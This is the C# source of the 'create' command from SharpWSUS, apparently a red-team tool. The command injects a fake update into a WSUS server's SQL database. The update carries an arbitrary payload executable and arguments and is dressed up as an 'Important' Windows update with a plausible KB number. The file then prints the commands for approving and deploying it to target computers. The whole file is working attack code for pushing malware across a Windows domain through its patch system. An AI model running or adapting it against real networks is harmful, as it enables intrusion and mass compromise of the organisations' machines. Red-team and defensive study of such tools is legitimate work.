using System;
using System.Data.SqlClient;
using System.Collections.Generic;

namespace SharpWSUS.Commands
{
    public class Create : ICommand
    {

        public static string CommandName => "create";
        public static int iRevisionID;
        public static string PayloadPath = "";
        public static string PayloadArgs = "";
        public static string UpdateTitle = "SharpWSUS Update";
        public static string UpdateDate = "2021-09-26";
        public static string UpdateRating = "Important";
        public static string UpdateMSRC = "";
        public static string UpdateKB = "5006103";
        public static string UpdateDescription = "Install this update to resolve issues in Windows.";
        public static string UpdateURL = @"https://www.nettitude.com";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Create Update");

            if (arguments.ContainsKey("/payload"))
            {
                PayloadPath = arguments["/payload"];
            }

            if (arguments.ContainsKey("/args"))
            {
                PayloadArgs = arguments["/args"];
            }

            if (arguments.ContainsKey("/title"))
            {
                UpdateTitle = arguments["/title"];
            }

            if (arguments.ContainsKey("/date"))
            {
                UpdateDate = arguments["/date"];
            }

            if (arguments.ContainsKey("/rating"))
            {
                UpdateRating = arguments["/rating"];
            }

            if (arguments.ContainsKey("/msrc"))
            {
                UpdateMSRC = arguments["/msrc"];
            }

            if (arguments.ContainsKey("/kb"))
            {
                UpdateKB = arguments["/kb"];
            }

            if (arguments.ContainsKey("/description"))
            {
                UpdateDescription = arguments["/description"];
            }

            if (arguments.ContainsKey("/url"))
            {
                UpdateURL = arguments["/url"];
            }

            Server.GetServerDetails();
            SqlCommand sqlComm = new SqlCommand();
            sqlComm.Connection = Connect.FsqlConnection();

            ClGuid.GenerateUpdateGUID();
            ClGuid.GenerateBundleGUID();

            ClFile clFileData = new ClFile(PayloadPath, PayloadArgs, Server.sLocalContentCacheLocation, true);
            
            Console.WriteLine("[*] Creating patch to use the following:");
            Console.WriteLine("[*] Payload: {0}",ClFile.sFileName);
            Console.WriteLine("[*] Payload Path: {0}", ClFile.sFilePath);
            Console.WriteLine("[*] Arguments: {0}", PayloadArgs);
            Console.WriteLine("[*] Arguments (HTML Encoded): {0}", ClFile.sArgs);

            if (!Enum.FbGetWSUSConfigSQL(sqlComm))
            {
                return;
            }
            if (!Build.FbImportUpdate(sqlComm))
            {
                return;
            }
            if (!Build.FbPrepareXMLtoClient(sqlComm))
            {
                return;
            }
            if (!Build.FbInjectUrl2Download(sqlComm))
            {
                return;
            }
            if (!Build.FbDeploymentRevision(sqlComm))
            {
                return;
            }
            if (!Build.FbPrepareBundle(sqlComm))
            {
                return;
            }
            if (!Build.FbPrepareXmlBundleToClient(sqlComm))
            {
                return;
            }
            if (!Build.FbDeploymentRevision(sqlComm))
            {
                return;
            }

            Console.WriteLine("\r\n[*] Update created - When ready to deploy use the following command:");
            Console.WriteLine("[*] SharpWSUS.exe approve /updateid:" + ClGuid.gBundle + " /computername:Target.FQDN /groupname:\"Group Name\"");
            Console.WriteLine("\r\n[*] To check on the update status use the following command:");
            Console.WriteLine("[*] SharpWSUS.exe check /updateid:" + ClGuid.gBundle + " /computername:Target.FQDN");
            Console.WriteLine("\r\n[*] To delete the update use the following command:");
            Console.WriteLine("[*] SharpWSUS.exe delete /updateid:" + ClGuid.gBundle + " /computername:Target.FQDN /groupname:\"Group Name\"");
            Console.WriteLine("\r\n[*] Create complete\r\n");
        }
    }
}